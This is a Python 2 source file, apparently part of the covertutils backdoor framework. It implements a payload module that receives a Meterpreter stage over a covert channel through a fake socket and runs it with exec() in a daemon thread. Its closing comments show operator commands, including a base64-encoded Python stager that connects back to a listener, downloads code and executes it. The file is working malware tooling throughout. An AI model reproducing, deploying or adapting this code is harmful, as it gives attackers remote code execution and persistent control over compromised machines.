

def init( storage ) :
	print "Initiating Meterpreter Module"
	from Queue import Queue
	from threading import Thread
	import socket,struct,time
	import io, threading

	storage['in_lock'] = threading.Lock()
	storage['out_lock'] = threading.Lock()

	threading.Condition()
	# storage['meterpreter_ins'] = bytearray()
	storage['meterpreter_ins'] = io.BytesIO()
	storage['meterpreter_outs'] = io.BytesIO()
# storage['meterpreter_outs'] = Queue()

	class PseudoSocket (object):
		# pass
		# socket

		def __init__(self, recv_stream = io.BytesIO(), send_stream = io.BytesIO(), recv_lock = threading.Lock(), send_lock = threading.Lock(), flush_every = 1) :
			self.recv_stream = recv_stream
			self.send_stream = send_stream
			self.recv_lock = recv_lock
			self.send_lock = send_lock
			self.flush_every = flush_every
			self.flush_count = 0
			self.recv_cond = threading.Condition()

		def _flush_if_needed( self, buffer ) :
			self.flush_count +=1
			if self.flush_count == self.flush_every :
				self.recv_stream.flush()
				# self.recv_stream.seek(0)
				print "[+] Flushed!"
				self.flush_count = 0

		def send( self, pkt ) :
			print "PseudoSocket send(): '%s'" % pkt.encode('hex')

			# storage['COMMON']['handler'].preferred_send(pkt, storage['stream'])
			# storage['meterpreter_outs'] = storage['meterpreter_outs'] + pkt
			sent_bytes = self.send_stream.write(pkt)
			print "[!]Outbuffer %d bytes" % sent_bytes

		def recv ( self, buf_size ) :
			print "PseudoSocket recv() - {"
			with self.recv_lock :
				self.recv_cond.acquire()
				self.recv_stream.seek(0)
				ret = self.recv_stream.read(buf_size)
				if ret == '' :
					self.recv_cond.wait()
				ret = self.recv_stream.read(buf_size)
				self._flush_if_needed(self.recv_stream)
				print ret.encode('hex')
			self.recv_cond.release()
			print "PseudoSocket recv(%d) from %d bytes }" % (buf_size, len(self.recv_stream.getvalue()))
			return ret


		def close( self ) :
			del self.send_stream
			del self.recv_stream

		# def connect( self ) : return True
		def getsockname( self ) :	return ("::", 4444)
		def getpeername( self ) :	return ("::", 4444)
		# def settimeout( self, timeout ) : return True

		def empty( self ) : return len(storage['meterpreter_ins'].getvalue()) == 0


	def meterpreter_stage( ) :

		print "Creating PseudoSocket"
		s = PseudoSocket( recv_stream = storage['meterpreter_ins'], send_stream = storage['meterpreter_outs'] )
		storage['socket'] = s
		print "Getting 4 bytes"
		l=struct.unpack('<I',s.recv(4))[0]
		print "Getting the rest %d bytes of Meterpreter" % l
		d=s.recv(l)
		while len(d)<l:
			print "%d bytes to go!" % l
			d+=s.recv(l-len(d))
		print "Executing Meterpreter main"

		meterpreter_main = d
		# assert '\x00' not in meterpreter_main
		# print "Null byte at: %d" % meterpreter_main.index('\x00')
		print meterpreter_main[-30:]
		print "[!] Goind to exec()!"
		exec(meterpreter_main,{'s':s})
		print "[+] Meterpreter CLOSED!"

	storage['meterpreter_thread'] = Thread( target = meterpreter_stage, args = () )
	storage['meterpreter_thread'].daemon = True
	print "Executing Meterpreter Thread"
	storage['meterpreter_thread'].start()

	return True


def work( storage, message ) :
	from time import sleep
	# print "[!] Meterpreter Handler Message Arrived!"
	# print message.encode('hex')
	# print message.encode('hex')
	# print "Outs: ",
	# print storage['meterpreter_outs']
	if message != 'X' :
		storage['socket'].recv_cond.acquire()
		with storage['in_lock'] :
			storage['meterpreter_ins'].write(message)
			storage['meterpreter_ins'].seek(0)
			storage['socket'].recv_cond.notify()
		storage['socket'].recv_cond.release()
	# print storage['meterpreter_ins'][-30:]
	# print "Message buffer: " + storage['meterpreter_ins']
	sleep(0.1)
	try :
		with storage['out_lock'] :
			ret = storage['meterpreter_outs'].getvalue()
			storage['meterpreter_outs'].flush()
		print "[!] Returning Meterpreter Response! {"
		print "%s" % ret.encode('hex')
		print "} Sent %d bytes." % ( len(ret) )
		# return ""
		return ret
	except Exception as e:
		print "[!!!] In work():"
		print e
		# print "Returned EMPTY message"
		return ''
	# return ''
'''

!stage mload covertutils.payloads.generic.meterpreter


!python print "A"

echo 'aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuOScsNDQ0NikpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=' | python-win
'''
from covertutils.shells.subshells import MeterpreterSubShell as shell
